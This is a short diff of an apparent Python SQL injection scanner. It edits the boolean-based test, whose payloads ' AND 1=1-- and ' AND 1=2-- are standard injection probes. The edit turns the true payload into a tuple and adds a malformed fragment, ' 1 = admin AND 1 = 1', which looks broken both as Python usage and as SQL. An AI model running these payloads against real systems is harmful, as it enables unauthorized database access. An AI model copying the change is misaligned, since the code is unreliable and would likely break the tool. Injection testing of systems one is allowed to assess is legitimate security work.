@@ -61,7 +61,7 @@ def union_based_sqli(target):
     return result
 
 def boolean_based_sqli(target):
-    true_payload = "' AND 1=1--"
+    true_payload = "' AND 1=1--", "' 1 = admin AND 1 = 1'"
     false_payload = "' AND 1=2--"
     result = "[*] Testing Boolean-Based SQL Injection...\n"
     try:
